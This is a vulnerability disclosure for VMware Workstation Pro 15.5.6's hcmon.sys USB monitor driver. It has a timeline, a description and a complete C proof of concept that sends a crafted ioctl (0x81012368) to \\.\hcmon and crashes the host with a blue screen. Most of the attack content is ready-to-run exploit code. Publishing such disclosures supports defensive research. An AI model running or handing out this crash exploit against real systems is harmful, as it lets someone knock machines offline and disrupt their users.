# VMware USB monitor allows attackers to cause blue screen
These page show one of the practical vulns that Found. I reported these bugs to Security@vmware.com on On 27/8/2020 and now I have been told they have ignored the bugs and the details can be published.  I think it is a must to list the detailed infomation here.
## Time Line
 * 27/8/2020 Bugs were reported to Security@vmware.com.
 * 25/9/2020 Vmware got confirmation that the poc could cause system crash.
 * 26/9/2020 Vmware ignored the infomation for the poc required privilige to file "\\\\.\\hcmon"
 * 12/11/2020 POC published.
 

 ## Abstract
 
* Name: VMware Workstation
* Date: 2020-8-27
* Reporter: Shuaibing Lu
* Vendor: http://www.vmware.com/
* Software Link: 3.https://my.vmware.com/cn/web/vmware/downloads/details?downloadGroup=WKST-1556-WIN&productId=799&rPId=47859
* Version: VMware Workstation Pro 15.5.6
### Description
Kernel module hcmon.sys in the USB monitor component of VMware Workstation Pro 15.5.6 allows attackers to inject a crafted argument via the argument of an ioctl on device "\\\\.\\hcmon" with the command **0x81012368** and cause a kernel crash.

To explore this vulnerability, some one must open the device file "\\\\.\\hcmon", call an ioctl system call on this device file with the command **0x81012368** and a crafted payload as the third argument.
### PoC
```
//Experimental environment: win10 x64

//Software official website:https://www.vmware.com/cn.html

//Software download address:http:https://my.vmware.com/cn/web/vmware/downloads/details?downloadGroup=WKST-1556-WIN&productId=799&rPId=47859

//Software version：15.5.6 build-16341506

//Affected Component:

//poc


#include<stdio.h>

#include <windows.h>

typedef struct _IO_STATUS_BLOCK {

    union {

        NTSTATUS Status;

        PVOID    Pointer;

    } DUMMYUNIONNAME;

    ULONG_PTR Information;

} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;



typedef NTSTATUS(NTAPI* NtDeviceIoControlFile)(

    HANDLE           FileHandle,

    HANDLE           Event,

    PVOID            ApcRoutine,

    PVOID            ApcContext,

    PIO_STATUS_BLOCK IoStatusBlock,

    ULONG            IoControlCode,

    PVOID            InputBuffer,

    ULONG            InputBufferLength,

    PVOID            OutputBuffer,

    ULONG            OutputBufferLength

    );

int main() {
    char  DeviceName[] = "\\\\.\\hcmon";
    long command = 0x81012368;
    HANDLE hDriver = CreateFileA(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    ULONG dw;

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("Open device failed.\n");
        system("pause");

        return(-1);

    }

    LPCWSTR nt = L"ntdll";

    HMODULE hntdll = GetModuleHandle(nt);

    IO_STATUS_BLOCK p = {};

    NtDeviceIoControlFile tDeviceIoControl = (NtDeviceIoControlFile)GetProcAddress((HMODULE)hntdll, "NtDeviceIoControlFile");

    if (!tDeviceIoControl) {

        printf("[-] Fail to resolve ZwDeviceIoControlFile(0x%X)\n", GetLastError());

        system("pause");

    }

    printf("Start poc execution.\n");
    LPVOID lpFakeBuffer = malloc(0x20000);

    memset(lpFakeBuffer, 0, 0x20000);

    LPVOID Address = malloc(0x20000);

    memset(Address, 0, 0x20000);

    tDeviceIoControl(hDriver, 0, 0, 0, &p, command, lpFakeBuffer, 0, (PVOID)Address, 0);

    return 0;

}
```
### References

CNVD: https://www.cnvd.org.cn/flaw/show/CNVD-2020-53155 

### Screenshot

![image](https://github.com/datadancer/WinSysVuln/blob/main/vmvare%20hcmon.jpg)
